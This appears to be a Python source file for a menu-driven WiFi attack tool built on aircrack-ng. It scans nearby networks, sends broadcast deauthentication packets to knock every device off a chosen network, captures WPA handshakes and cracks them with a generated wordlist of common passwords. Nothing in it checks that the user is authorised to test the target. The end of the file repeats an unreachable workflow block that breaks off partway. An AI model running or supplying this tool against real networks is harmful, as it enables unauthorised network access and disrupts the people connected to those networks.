import os
import sys
import subprocess
import platform
import time
import random
import string
from datetime import datetime

class MxAI:
    def __init__(self):
        self.system = platform.system()
        self.wifi_interfaces = []
        self.selected_interface = None
        self.wordlist_path = None
        self.deauth_count = 0
        self.capture_file = None
        
    def detect_wifi_interfaces(self):
        if self.system == "Linux":
            try:
                result = subprocess.run(['iwconfig'], capture_output=True, text=True, shell=True)
                lines = result.stdout.split('\n')
                interfaces = []
                for line in lines:
                    if 'IEEE' in line or 'ESSID' in line:
                        iface = line.split()[0]
                        if iface not in interfaces and iface:
                            interfaces.append(iface)
                self.wifi_interfaces = interfaces
                return interfaces
            except:
                return []
        elif self.system == "Windows":
            try:
                result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                interfaces = []
                for line in lines:
                    if 'Name' in line and ':' in line:
                        iface = line.split(':')[1].strip()
                        if iface and iface not in interfaces:
                            interfaces.append(iface)
                self.wifi_interfaces = interfaces
                return interfaces
            except:
                return []
        return []
    
    def select_interface(self, interface_name=None):
        if not self.wifi_interfaces:
            self.detect_wifi_interfaces()
        
        if interface_name:
            if interface_name in self.wifi_interfaces:
                self.selected_interface = interface_name
                return True
            else:
                return False
        else:
            if self.wifi_interfaces:
                print("Available WiFi interfaces:")
                for i, iface in enumerate(self.wifi_interfaces, 1):
                    print(f"{i}. {iface}")
                try:
                    choice = int(input("Select interface number: "))
                    if 1 <= choice <= len(self.wifi_interfaces):
                        self.selected_interface = self.wifi_interfaces[choice-1]
                        return True
                except:
                    pass
        return False
    
    def scan_networks(self):
        if not self.selected_interface:
            print("No interface selected")
            return []
        
        networks = []
        
        # Linux scanning
        if self.system == "Linux":
            try:
                subprocess.run(['airmon-ng', 'start', self.selected_interface], capture_output=True)
                monitor_iface = f"{self.selected_interface}mon"
                result = subprocess.run(['airodump-ng', monitor_iface, '--output-format', 'csv', '-w', 'scan'], 
                                      capture_output=True, text=True, timeout=10)
                lines = result.stdout.split('\n')
                for line in lines:
                    if ':' in line and ',' in line:
                        parts = line.split(',')
                        if len(parts) > 13:
                            bssid = parts[0].strip()
                            essid = parts[13].strip()
                            channel = parts[3].strip()
                            encryption = parts[5].strip()
                            if bssid and essid:
                                networks.append({
                                    'bssid': bssid,
                                    'essid': essid,
                                    'channel': channel,
                                    'encryption': encryption
                                })
                subprocess.run(['airmon-ng', 'stop', monitor_iface], capture_output=True)
            except:
                pass
        elif self.system == "Windows":
            try:
                result = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'mode=bssid'], 
                                      capture_output=True, text=True, encoding='utf-8', errors='ignore')
                
                networks = []
                lines = result.stdout.split('\n')
                
                current_ssid = None
                bssid_count = 0
                
                for i, line in enumerate(lines):
                    line = line.strip()
                    
                    # Detect SSID line
                    if line.startswith('SSID'):
                        parts = line.split(':', 1)
                        if len(parts) > 1:
                            current_ssid = parts[1].strip()
                            bssid_count = 0
                    
                    # Detect BSSID line
                    elif current_ssid and 'BSSID' in line:
                        parts = line.split(':', 1)
                        if len(parts) > 1:
                            bssid = parts[1].strip()
                            bssid_count += 1
                            
                            # Look ahead for channel and authentication
                            channel = '?'
                            encryption = 'Unknown'
                            
                            # Get the next few lines for this BSSID
                            for j in range(i, min(i+15, len(lines))):
                                next_line = lines[j].strip()
                                if 'Channel' in next_line and ':' in next_line:
                                    channel_parts = next_line.split(':', 1)
                                    if len(channel_parts) > 1:
                                        channel_text = channel_parts[1].strip()
                                        # Extract just the channel number
                                        if ' ' in channel_text:
                                            channel = channel_text.split()[0]
                                        else:
                                            channel = channel_text
                                elif 'Authentication' in next_line and ':' in next_line:
                                    auth_parts = next_line.split(':', 1)
                                    if len(auth_parts) > 1:
                                        encryption = auth_parts[1].strip()
                                elif 'Encryption' in next_line and ':' in next_line:
                                    enc_parts = next_line.split(':', 1)
                                    if len(enc_parts) > 1:
                                        encryption = enc_parts[1].strip()
                                elif j > i and ('BSSID' in next_line or 'SSID' in next_line):
                                    break
                            
                            # Add network entry
                            network_name = current_ssid if current_ssid else f"Hidden_{bssid_count}"
                            networks.append({
                                'essid': network_name,
                                'bssid': bssid,
                                'channel': channel,
                                'encryption': encryption
                            })
                
                # If no BSSID mode results, try simple scan
                if not networks:
                    result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], 
                                          capture_output=True, text=True, encoding='utf-8', errors='ignore')
                    lines = result.stdout.split('\n')
                    
                    for line in lines:
                        if 'SSID' in line and ':' in line:
                            parts = line.split(':', 1)
                            if len(parts) > 1:
                                essid = parts[1].strip()
                                if essid and not essid.isdigit():  # Skip number-only SSIDs
                                    networks.append({
                                        'essid': essid,
                                        'bssid': 'Scan for details',
                                        'channel': '?',
                                        'encryption': 'WPA2-Personal'
                                    })
                
                return networks
                
            except Exception as e:
                print(f"Windows scan error: {e}")
                return []
        return networks
    
    def generate_wordlist(self, base_words=None, output_file="mxai_wordlist.txt"):
        if not base_words:
            base_words = ["password", "admin", "123456", "wifi", "internet", "home", "office"]
        
        wordlist = set()
        
        for word in base_words:
            wordlist.add(word)
            wordlist.add(word.upper())
            wordlist.add(word.capitalize())
            
            for year in range(2000, 2026):
                wordlist.add(f"{word}{year}")
                wordlist.add(f"{word}{str(year)[2:]}")
            
            for i in range(0, 100):
                wordlist.add(f"{word}{i:02d}")
            
            special_chars = ["!", "@", "#", "$", "%", "&", "*"]
            for char in special_chars:
                wordlist.add(f"{word}{char}")
                wordlist.add(f"{char}{word}")
        
        common_passwords = [
            "12345678", "password123", "admin123", "letmein", "qwerty",
            "monkey", "dragon", "baseball", "football", "mustang",
            "master", "hello", "secret", "asdfgh", "jkl;", "zxcvbn",
            "superman", "batman", "trustno1", "sunshine", "iloveyou"
        ]
        
        for pwd in common_passwords:
            wordlist.add(pwd)
        
        with open(output_file, 'w') as f:
            for word in sorted(wordlist):
                f.write(f"{word}\n")
        
        self.wordlist_path = output_file
        return output_file
    
    def deauth_attack(self, target_bssid, client_mac="ff:ff:ff:ff:ff:ff", count=10):
        if not self.selected_interface:
            print("No interface selected")
            return False
        
        self.deauth_count = count
        
        if self.system == "Linux":
            try:
                subprocess.run(['airmon-ng', 'start', self.selected_interface], capture_output=True)
                monitor_iface = f"{self.selected_interface}mon"
                
                deauth_cmd = [
                    'aireplay-ng', '--deauth', str(count),
                    '-a', target_bssid,
                    '-c', client_mac,
                    monitor_iface
                ]
                
                print(f"Starting deauth attack on {target_bssid}")
                process = subprocess.Popen(deauth_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(2)
                process.terminate()
                
                subprocess.run(['airmon-ng', 'stop', monitor_iface], capture_output=True)
                return True
            except:
                return False
        elif self.system == "Windows":
            print("Deauth attack requires Linux with monitor mode support")
            return False
        return False
    
    def capture_handshake(self, target_bssid, channel, output_file="handshake.cap"):
        if not self.selected_interface:
            print("No interface selected")
            return False
        
        if self.system == "Linux":
            try:
                subprocess.run(['airmon-ng', 'start', self.selected_interface, channel], capture_output=True)
                monitor_iface = f"{self.selected_interface}mon"
                
                capture_cmd = [
                    'airodump-ng', '--bssid', target_bssid,
                    '--channel', channel,
                    '--write', output_file.replace('.cap', ''),
                    monitor_iface
                ]
                
                print(f"Capturing handshake for {target_bssid} on channel {channel}")
                process = subprocess.Popen(capture_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                time.sleep(30)
                process.terminate()
                
                subprocess.run(['airmon-ng', 'stop', monitor_iface], capture_output=True)
                
                self.capture_file = output_file
                return os.path.exists(output_file)
            except:
                return False
        else:
            print("Handshake capture requires Linux")
            return False
    
    def crack_password(self, capture_file=None, wordlist=None):
        if not capture_file:
            capture_file = self.capture_file
        if not wordlist:
            wordlist = self.wordlist_path
        
        if not capture_file or not wordlist:
            print("Missing capture file or wordlist")
            return None
        
        if not os.path.exists(capture_file):
            print(f"Capture file not found: {capture_file}")
            return None
        
        if not os.path.exists(wordlist):
            print(f"Wordlist not found: {wordlist}")
            return None
        
        if self.system == "Linux":
            try:
                crack_cmd = [
                    'aircrack-ng', capture_file,
                    '-w', wordlist
                ]
                
                result = subprocess.run(crack_cmd, capture_output=True, text=True, timeout=300)
                
                if "KEY FOUND" in result.stdout:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if "KEY FOUND" in line:
                            parts = line.split(']')
                            if len(parts) > 1:
                                password = parts[1].strip().split()[0]
                                return password
                return None
            except subprocess.TimeoutExpired:
                print("Cracking timed out")
                return None
            except:
                return None
        else:
            print("Password cracking requires Linux with aircrack-ng")
            return None
    
    def set_monitor_mode(self, enable=True):
        if not self.selected_interface:
            print("No interface selected")
            return False
        
        if self.system == "Linux":
            try:
                if enable:
                    result = subprocess.run(['airmon-ng', 'start', self.selected_interface], 
                                          capture_output=True, text=True)
                    if "monitor mode enabled" in result.stdout.lower():
                        return True
                else:
                    result = subprocess.run(['airmon-ng', 'stop', self.selected_interface], 
                                          capture_output=True, text=True)
                    if "monitor mode disabled" in result.stdout.lower():
                        return True
            except:
                pass
        return False
    
    def check_dependencies(self):
        missing = []
        
        if self.system == "Linux":
            tools = ['iwconfig', 'airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']
            for tool in tools:
                try:
                    subprocess.run(['which', tool], capture_output=True, check=True)
                except:
                    missing.append(tool)
        elif self.system == "Windows":
            # On Windows, netsh should always be available
            # Try to run a simple netsh command to check
            try:
                # Try to get help or version info
                result = subprocess.run(['netsh', '-?'], 
                                      capture_output=True, text=True, shell=True, timeout=2)
                if result.returncode != 0 and 'is not recognized' in result.stderr:
                    missing.append('netsh')
            except:
                # If we can't check, assume it's available (it's built into Windows)
                pass
        
        return missing
    
    def show_banner(self):
        banner = """
        ╔══════════════════════════════════════════════════════════╗
        ║                    MxAI WiFi Tool v1.0                   ║
        ║                 Developed by Manoj Kumar                 ║
        ║         Cross-platform WiFi Security Assessment          ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(banner)

def main():
    tool = MxAI()
    
    # Startup message
    print("\n" + "="*60)
    print("Starting MxAI WiFi Tool...")
    print("Developed by Manoj Kumar")
    print("Instagram: @_golu_.650")
    print("="*60)
    time.sleep(1)
    
    tool.show_banner()
    
    print("Checking dependencies...")
    missing = tool.check_dependencies()
    if missing:
        print(f"Missing tools: {', '.join(missing)}")
        if tool.system == "Linux":
            print("Install with: sudo apt-get install aircrack-ng")
    
    def show_menu():
        print("\n" + "="*60)
        print("=== MxAI WiFi Tool - Main Menu ===")
        print("="*60)
        print("1. Auto-detect WiFi interface")
        print("2. Scan all nearby networks")
        print("3. Select target network")
        print("4. Choose attack type")
        print("5. Manual mode")
        print("6. Monitor mode toggle (Linux only)")
        print("7. Exit")
        print("="*60)
    
    show_menu()
    
    while True:
        try:
            choice = input("\nSelect option (1-7): ").strip()
            
            if choice == "1":
                print("\n" + "="*60)
                print("=== WiFi Interface Detection ===")
                print("="*60)
                
                print("\nDetecting WiFi interfaces...")
                interfaces = tool.detect_wifi_interfaces()
                if not interfaces:
                    print("No WiFi interfaces found!")
                    show_menu()
                    continue
                
                print(f"Found interfaces: {', '.join(interfaces)}")
                
                if len(interfaces) == 1:
                    tool.selected_interface = interfaces[0]
                    print(f"Auto-selected: {tool.selected_interface}")
                else:
                    print("\nSelect WiFi interface:")
                    for i, iface in enumerate(interfaces, 1):
                        print(f"{i}. {iface}")
                    try:
                        iface_choice = int(input("Enter number: "))
                        if 1 <= iface_choice <= len(interfaces):
                            tool.selected_interface = interfaces[iface_choice-1]
                            print(f"Selected: {tool.selected_interface}")
                        else:
                            print("Invalid choice")
                            show_menu()
                            continue
                    except:
                        print("Invalid input")
                        show_menu()
                        continue
                
                # Wordlist selection
                print("\n" + "-"*60)
                print("=== Wordlist Selection ===")
                print("-"*60)
                print("1. Use default wordlist")
                print("2. Use custom wordlist")
                print("3. Back to menu")
                
                wordlist_choice = input("\nSelect wordlist option (1-3): ").strip()
                
                if wordlist_choice == "1":
                    if not tool.wordlist_path or not os.path.exists(tool.wordlist_path):
                        print("\nGenerating default wordlist...")
                        tool.generate_wordlist()
                        print(f"Wordlist generated: {tool.wordlist_path}")
                        with open(tool.wordlist_path, 'r') as f:
                            count = sum(1 for _ in f)
                        print(f"Total passwords: {count}")
                    else:
                        print(f"\nUsing existing wordlist: {tool.wordlist_path}")
                        with open(tool.wordlist_path, 'r') as f:
                            count = sum(1 for _ in f)
                        print(f"Total passwords: {count}")
                
                elif wordlist_choice == "2":
                    custom_path = input("\nEnter wordlist file path: ").strip()
                    if os.path.exists(custom_path):
                        tool.wordlist_path = custom_path
                        print(f"Using custom wordlist: {tool.wordlist_path}")
                        try:
                            with open(tool.wordlist_path, 'r') as f:
                                count = sum(1 for _ in f)
                            print(f"Total passwords: {count}")
                        except:
                            print("Could not read wordlist file")
                    else:
                        print("File not found! Using default wordlist...")
                        if not tool.wordlist_path or not os.path.exists(tool.wordlist_path):
                            tool.generate_wordlist()
                        print(f"Wordlist: {tool.wordlist_path}")
                
                elif wordlist_choice == "3":
                    print("Returning to menu...")
                    show_menu()
                    continue
                else:
                    print("Invalid choice. Using default wordlist...")
                    if not tool.wordlist_path or not os.path.exists(tool.wordlist_path):
                        tool.generate_wordlist()
                    print(f"Wordlist: {tool.wordlist_path}")
                
                print("\nInterface and wordlist configured successfully!")
                show_menu()
            
            elif choice == "2":
                if not tool.selected_interface:
                    print("\nPlease run option 1 first to select interface")
                    show_menu()
                    continue
                
                print("\n" + "="*60)
                print("=== Network Scanning ===")
                print("="*60)
                print("\nScanning for nearby WiFi networks...")
                print("This may take 10-15 seconds...")
                
                networks = tool.scan_networks()
                
                if not networks:
                    print("No WiFi networks found in range!")
                    show_menu()
                    continue
                
                print(f"\nFound {len(networks)} network(s) in range:")
                print("="*60)
                for i, net in enumerate(networks, 1):
                    essid = net.get('essid', 'Hidden')
                    bssid = net.get('bssid', 'Unknown')
                    channel = net.get('channel', '?')
                    encryption = net.get('encryption', 'Unknown')
                    print(f"{i}. {essid}")
                    print(f"   BSSID: {bssid}")
                    print(f"   Channel: {channel} | Encryption: {encryption}")
                    print("-"*60)
                
                # Ask if user wants to select a target
                print("\nOptions:")
                print("1. Select a target network for attack")
                print("2. Back to menu")
                
                scan_choice = input("\nSelect option (1-2): ").strip()
                
                if scan_choice == "1":
                    # Get network selection
                    try:
                        net_choice_input = input(f"\nSelect target network (1-{len(networks)}): ").strip()
                        if not net_choice_input:
                            print("No selection made")
                            show_menu()
                            continue
                        
                        net_choice = int(net_choice_input)
                        if not (1 <= net_choice <= len(networks)):
                            print("Invalid choice")
                            show_menu()
                            continue
                        
                        target_network = networks[net_choice-1]
                        target_bssid = target_network.get('bssid', 'Unknown')
                        target_essid = target_network.get('essid', 'Hidden Network')
                        target_channel = target_network.get('channel', '?')
                        target_encryption = target_network.get('encryption', 'Unknown')
                        
                        print("\n" + "="*60)
                        print("=== Target Selected ===")
                        print("="*60)
                        print(f"Network: {target_essid}")
                        print(f"BSSID: {target_bssid}")
                        print(f"Channel: {target_channel}")
                        print(f"Encryption: {target_encryption}")
                        print("="*60)
                        
                    except ValueError:
                        print("Please enter a valid number")
                        show_menu()
                        continue
                    except KeyboardInterrupt:
                        print("\nSelection cancelled.")
                        show_menu()
                        continue
                    except Exception as e:
                        print(f"Error selecting network: {e}")
                        show_menu()
                        continue
                    
                    # Attack selection
                    print("\n" + "="*60)
                    print("=== Select Attack Type ===")
                    print("="*60)
                    print("1. Deauthentication Attack (Disconnect devices)")
                    print("2. Password Attack (Capture & Crack handshake)")
                    print("3. Both attacks (Combined)")
                    print("4. Back to menu")
                    print("="*60)
                    
                    while True:
                        attack_choice = input("\nSelect attack (1-4): ").strip()
                        if attack_choice in ["1", "2", "3", "4"]:
                            break
                        else:
                            print("Invalid choice. Please enter 1, 2, 3, or 4.")
                    
                    if attack_choice == "1":
                        print("\n" + "="*60)
                        print("=== Deauthentication Attack ===")
                        print("="*60)
                        print(f"Target: {target_essid}")
                        
                        if tool.system != "Linux":
                            print("\nWARNING: Deauth attack requires Linux with monitor mode!")
                            print("On Windows, this feature is not available.")
                            print("\nReturning to menu...")
                        else:
                            client_mac = input("\nEnter specific client MAC (or press Enter for broadcast): ").strip()
                            if not client_mac:
                                client_mac = "ff:ff:ff:ff:ff:ff"
                                print("Using broadcast MAC (will disconnect all devices)")
                            
                            try:
                                deauth_count = int(input("Number of deauth packets (default 10): ") or "10")
                            except:
                                deauth_count = 10
                            
                            print("\nEnabling monitor mode...")
                            tool.set_monitor_mode(True)
                            
                            print(f"Sending {deauth_count} deauth packets...")
                            if tool.deauth_attack(target_bssid, client_mac, deauth_count):
                                print(f"SUCCESS: Deauth attack completed! Sent {deauth_count} packets.")
                                print("Devices should be disconnected from the network.")
                            else:
                                print("FAILED: Deauth attack failed.")
                                print("Make sure you have aircrack-ng installed and proper permissions.")
                            
                            print("\nDisabling monitor mode...")
                            tool.set_monitor_mode(False)
                        
                        print("\nPress Enter to continue...")
                        input()
                        show_menu()
                    
                    elif attack_choice == "2":
                        print("\n" + "="*60)
                        print("=== Password Attack ===")
                        print("="*60)
                        print(f"Target: {target_essid}")
                        print("This will capture handshake and attempt to crack password.")
                        
                        if tool.system != "Linux":
                            print("\nWARNING: Password attack requires Linux with monitor mode!")
                            print("On Windows, this feature is not available.")
                            print("You can:")
                            print("  1. Use a Linux system with a compatible WiFi adapter")
                            print("  2. Try deauth attack (option 1) if on Linux")
                            print("\nReturning to menu...")
                        else:
                            print("\nEnabling monitor mode...")
                            if tool.set_monitor_mode(True):
                                print("Monitor mode enabled")
                            else:
                                print("WARNING: Could not enable monitor mode automatically")
                                print("You may need to enable it manually: sudo airmon-ng start <interface>")
                            
                            capture_file = f"handshake_{target_bssid.replace(':', '')}.cap"
                            
                            print(f"\nCapturing handshake on channel {target_channel}...")
                            print("Tip: You need to wait for a device to connect to the network.")
                            print("     Or trigger connection by running deauth attack first.")
                            
                            confirm = input("\nStart capture? (y/n): ").lower()
                            if confirm == 'y':
                                print("\nCapturing... (This will take about 30 seconds)")
                                if tool.capture_handshake(target_bssid, target_channel, capture_file):
                                    print(f"SUCCESS: Handshake captured: {capture_file}")
                                    
                                    print("\nStarting password cracking...")
                                    print(f"Using wordlist: {tool.wordlist_path}")
                                    print("This may take several minutes...")
                                    
                                    password = tool.crack_password(capture_file)
                                    if password:
                                        print(f"\nSUCCESS! Password found: {password}")
                                        print(f"Network: {target_essid}")
                                        print(f"Password: {password}")
                                    else:
                                        print("\nPassword not found in wordlist.")
                                        print("Try with a larger wordlist or different attack method.")
                                else:
                                    print("FAILED: Failed to capture handshake.")
                                    print("Make sure devices are connected to the network.")
                            else:
                                print("Capture cancelled.")
                            
                            print("\nDisabling monitor mode...")
                            if tool.set_monitor_mode(False):
                                print("Monitor mode disabled")
                        
                        print("\nPress Enter to continue...")
                        input()
                        show_menu()
                    
                    elif attack_choice == "3":
                        print("\n" + "="*60)
                        print("=== Combined Attack ===")
                        print("="*60)
                        print(f"Target: {target_essid}")
                        
                        if tool.system != "Linux":
                            print("\nWARNING: Combined attack requires Linux with monitor mode!")
                            print("On Windows, this feature is not available.")
                            print("\nReturning to menu...")
                        else:
                            print("\nEnabling monitor mode...")
                            tool.set_monitor_mode(True)
                            
                            print("\nStep 1: Deauth attack to trigger handshake...")
                            if tool.deauth_attack(target_bssid, "ff:ff:ff:ff:ff:ff", 5):
                                print("Deauth packets sent. Waiting for reconnection...")
                                time.sleep(3)
                                
                                print("\nStep 2: Capturing handshake...")
                                capture_file = f"handshake_{target_bssid.replace(':', '')}.cap"
                                
                                if tool.capture_handshake(target_bssid, target_channel, capture_file):
                                    print(f"SUCCESS: Handshake captured: {capture_file}")
                                    
                                    print("\nStep 3: Cracking password...")
                                    print(f"Using wordlist: {tool.wordlist_path}")
                                    password = tool.crack_password(capture_file)
                                    if password:
                                        print(f"\nSUCCESS! Password: {password}")
                                        print(f"Network: {target_essid}")
                                        print(f"Password: {password}")
                                    else:
                                        print("Password not found in wordlist.")
                                else:
                                    print("FAILED: Handshake capture failed.")
                            else:
                                print("FAILED: Deauth attack failed.")
                            
                            print("\nDisabling monitor mode...")
                            tool.set_monitor_mode(False)
                        
                        print("\nPress Enter to continue...")
                        input()
                        show_menu()
                    
                    elif attack_choice == "4":
                        print("Returning to menu...")
                        show_menu()
                else:
                    show_menu()
            
            elif choice == "3":
                print("\n" + "="*60)
                print("=== Manual Target Selection ===")
                print("="*60)
                if not tool.selected_interface:
                    print("Please select interface first (option 1)")
                    show_menu()
                    continue
                
                target_bssid = input("Enter target BSSID: ").strip()
                target_essid = input("Enter target ESSID (name): ").strip()
                target_channel = input("Enter channel: ").strip()
                
                print(f"\nTarget: {target_essid} ({target_bssid}) on channel {target_channel}")
                print("1. Deauth attack")
                print("2. Password attack")
                print("3. Both attacks")
                
                attack = input("Select attack: ").strip()
                
                if attack == "1":
                    count = input("Deauth packets (default 10): ").strip()
                    count = int(count) if count.isdigit() else 10
                    if tool.deauth_attack(target_bssid, "ff:ff:ff:ff:ff:ff", count):
                        print(f"Deauth attack sent {count} packets")
                    else:
                        print("Deauth attack failed")
                
                elif attack == "2":
                    if tool.system != "Linux":
                        print("Password attack requires Linux")
                        show_menu()
                        continue
                    
                    capture_file = f"handshake_{target_bssid.replace(':', '')}.cap"
                    if tool.capture_handshake(target_bssid, target_channel, capture_file):
                        print(f"Handshake captured: {capture_file}")
                        password = tool.crack_password(capture_file)
                        if password:
                            print(f"Password found: {password}")
                        else:
                            print("Password not found")
                    else:
                        print("Failed to capture handshake")
                
                elif attack == "3":
                    print("Combined attack...")
                    if tool.deauth_attack(target_bssid, "ff:ff:ff:ff:ff:ff", 5):
                        time.sleep(2)
                        capture_file = f"handshake_{target_bssid.replace(':', '')}.cap"
                        if tool.capture_handshake(target_bssid, target_channel, capture_file):
                            password = tool.crack_password(capture_file)
                            if password:
                                print(f"Password found: {password}")
                            else:
                                print("Password not found")
                        else:
                            print("Handshake capture failed")
                    else:
                        print("Deauth attack failed")
                
                print("\nPress Enter to continue...")
                input()
                show_menu()
            
            elif choice == "4":
                print("\n" + "="*60)
                print("=== Attack Type Selection ===")
                print("="*60)
                print("1. Deauthentication Attack Only")
                print("2. Password Cracking Attack Only")
                print("3. Combined Attack (Deauth + Crack)")
                print("4. Back")
                
                attack_type = input("Select: ").strip()
                if attack_type in ["1", "2", "3"]:
                    print(f"\nAttack type {attack_type} selected")
                    print("Run option 2 to scan and select target")
                
                show_menu()
            
            elif choice == "5":
                print("\n" + "="*60)
                print("=== Manual Mode ===")
                print("="*60)
                print("1. Detect WiFi interfaces")
                print("2. Scan networks")
                print("3. Generate wordlist")
                print("4. Deauth attack")
                print("5. Capture handshake")
                print("6. Crack password")
                print("7. Back to main menu")
                
                manual_choice = input("Select: ").strip()
                
                if manual_choice == "1":
                    interfaces = tool.detect_wifi_interfaces()
                    if interfaces:
                        print(f"Found interfaces: {', '.join(interfaces)}")
                        tool.select_interface()
                    else:
                        print("No WiFi interfaces found")
                
                elif manual_choice == "2":
                    if not tool.selected_interface:
                        print("Please select interface first")
                        show_menu()
                        continue
                    networks = tool.scan_networks()
                    if networks:
                        print("\nDiscovered networks:")
                        for i, net in enumerate(networks, 1):
                            print(f"{i}. {net.get('essid', 'Unknown')} ({net.get('bssid', 'Unknown')})")
                    else:
                        print("No networks found")
                
                elif manual_choice == "3":
                    custom_words = input("Enter base words (comma separated) or press Enter for default: ")
                    if custom_words:
                        base_words = [w.strip() for w in custom_words.split(',')]
                    else:
                        base_words = None
                    filename = tool.generate_wordlist(base_words)
                    print(f"Wordlist generated: {filename}")
                
                elif manual_choice == "4":
                    if not tool.selected_interface:
                        print("Please select interface first")
                        show_menu()
                        continue
                    target = input("Enter target BSSID: ").strip()
                    client = input("Enter client MAC (or press Enter for broadcast): ").strip()
                    if not client:
                        client = "ff:ff:ff:ff:ff:ff"
                    try:
                        count = int(input("Number of deauth packets: "))
                    except:
                        count = 10
                    if tool.deauth_attack(target, client, count):
                        print(f"Deauth attack sent {count} packets")
                    else:
                        print("Deauth attack failed")
                
                elif manual_choice == "5":
                    if not tool.selected_interface:
                        print("Please select interface first")
                        show_menu()
                        continue
                    target = input("Enter target BSSID: ").strip()
                    channel = input("Enter channel: ").strip()
                    if tool.capture_handshake(target, channel):
                        print("Handshake capture started")
                    else:
                        print("Handshake capture failed")
                
                elif manual_choice == "6":
                    cap_file = input("Enter capture file (or press Enter for last): ").strip()
                    if not cap_file:
                        cap_file = None
                    wordlist = input("Enter wordlist file (or press Enter for generated): ").strip()
                    if not wordlist:
                        wordlist = None
                    password = tool.crack_password(cap_file, wordlist)
                    if password:
                        print(f"Password found: {password}")
                    else:
                        print("Password not found in wordlist")
                
                print("\nPress Enter to continue...")
                input()
                show_menu()
            
            elif choice == "6":
                print("\n" + "="*60)
                print("=== Monitor Mode Toggle (Linux Only) ===")
                print("="*60)
                if tool.system != "Linux":
                    print("WARNING: Monitor mode is only available on Linux systems")
                    print("Windows does not support monitor mode for WiFi adapters")
                else:
                    if not tool.selected_interface:
                        print("Please select a WiFi interface first (option 1)")
                    else:
                        print(f"Current interface: {tool.selected_interface}")
                        print("\n1. Enable monitor mode")
                        print("2. Disable monitor mode")
                        print("3. Back to menu")
                        
                        mode_choice = input("\nSelect: ").strip()
                        
                        if mode_choice == "1":
                            print("\nEnabling monitor mode...")
                            if tool.set_monitor_mode(True):
                                print("SUCCESS: Monitor mode enabled")
                                print(f"Interface: {tool.selected_interface}mon")
                            else:
                                print("FAILED: Failed to enable monitor mode")
                                print("Make sure aircrack-ng is installed and you have root privileges")
                        
                        elif mode_choice == "2":
                            print("\nDisabling monitor mode...")
                            if tool.set_monitor_mode(False):
                                print("SUCCESS: Monitor mode disabled")
                                print(f"Interface: {tool.selected_interface}")
                            else:
                                print("FAILED: Failed to disable monitor mode")
                        
                        elif mode_choice == "3":
                            print("Returning to menu...")
                
                print("\nPress Enter to continue...")
                input()
                show_menu()
            
            elif choice == "7":
                print("\nExiting MxAI Tool")
                print("Thank you for using MxAI WiFi Tool!")
                break
            
            else:
                print("Invalid choice. Please select 1-7.")
                show_menu()
        
        except KeyboardInterrupt:
            print("\n\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")
            show_menu()
            
            if choice == "1":
                print("\n=== Auto Workflow ===")
                
                print("\nStep 1: Detecting WiFi interfaces...")
                interfaces = tool.detect_wifi_interfaces()
                if not interfaces:
                    print("No WiFi interfaces found!")
                    continue
                
                print(f"Found interfaces: {', '.join(interfaces)}")
                
                if len(interfaces) == 1:
                    tool.selected_interface = interfaces[0]
                    print(f"Auto-selected: {tool.selected_interface}")
                else:
                    print("\nSelect WiFi interface:")
                    for i, iface in enumerate(interfaces, 1):
                        print(f"{i}. {iface}")
                    try:
                        iface_choice = int(input("Enter number: "))
                        if 1 <= iface_choice <= len(interfaces):
                            tool.selected_interface = interfaces[iface_choice-1]
                            print(f"Selected: {tool.selected_interface}")
                        else:
                            print("Invalid choice")
                            continue
                    except:
                        print("Invalid input")
                        continue
                
                print("\nStep 2: Checking wordlist...")
                if not tool.wordlist_path or not os.path.exists(tool.wordlist_path):
                    print("No wordlist found. Generating default wordlist...")
                    tool.generate_wordlist()
                    print(f"Wordlist generated: {tool.wordlist_path}")
                else:
                    print(f"Using existing wordlist: {tool.wordlist_path}")
                
                print("\nStep 3: Scanning for nearby WiFi networks...")
                print("This may take 10-15 seconds...")
                networks = tool.scan_networks()
                
                if not networks:
                    print("No WiFi networks found in range!")
                    continue
                
                print(f"\nFound {len(networks)} network(s) in range:")
                print("="*60)
                for i, net in enumerate(networks, 1):
                    essid = net.get('essid', 'Hidden')
                    bssid = net.get('bssid', 'Unknown')
                    channel = net.get('channel', '?')
                    encryption = net.get('encryption', 'Unknown')
                    print(f"{i}. {essid}")
                    print(f"   BSSID: {bssid}")
                    print(f"   Channel: {channel} | Encryption: {encryption}")
                    print("-"*40)
                
                # Get network selection
                try:
                    net_choice_input = input(f"\nSelect target network (1-{len(networks)}): ").strip()
                    if not net_choice_input:
                        print("No selection made")
                        continue
                    
                    net_choice = int(net_choice_input)
                    if not (1 <= net_choice <= len(networks)):
                        print("Invalid choice")
                        continue
                    
                    target_network = networks[net_choice-1]
                    target_bssid = target_network.get('bssid', 'Unknown')
                    target_essid = target_network.get('essid', 'Hidden Network')
                    target_channel = target_network.get('channel', '?')
                    target_encryption = target_network.get('encryption', 'Unknown')
                    
                    print(f"\nSelected target: {target_essid}")
                    print(f"BSSID: {target_bssid}")
                    print(f"Channel: {target_channel}")
                    print(f"Encryption: {target_encryption}")
                    
                except ValueError:
                    print("Please enter a valid number")
                    continue
                except KeyboardInterrupt:
                    print("\nSelection cancelled.")
                    continue
                except Exception as e:
                    print(f"Error selecting network: {e}")
                    continue
                
                # Attack selection
                print("\nStep 4: Select attack type:")
                print("1. Deauthentication Attack (Disconnect devices)")
                print("2. Password Attack (Capture & Crack handshake)")
                print("3. Both attacks")
                print("4. Back to menu")
                
                while True:
                    attack_choice = input("\nSelect attack (1-4): ").strip()
                    if attack_choice in ["1", "2", "3", "4"]:
                        break
                    else:
                        print("Invalid choice. Please enter 1, 2, 3, or 4.")
                
                if attack_choice == "1":
                    print(f"\n📡 Starting deauth attack on {target_essid}...")
                    
                    if tool.system != "Linux":
                        print("\n⚠ Deauth attack requires Linux with monitor mode!")
                        print("On Windows, this feature is not available.")
                        print("\nReturning to menu...")
                    else:
                        client_mac = input("Enter specific client MAC (or press Enter for broadcast): ").strip()
                        if not client_mac:
                            client_mac = "ff:ff:ff:ff:ff:ff"
                            print("Using broadcast MAC (will disconnect all devices)")
                        
                        try:
                            deauth_count = int(input("Number of deauth packets (default 10): ") or "10")
                        except:
                            deauth_count = 10
                        
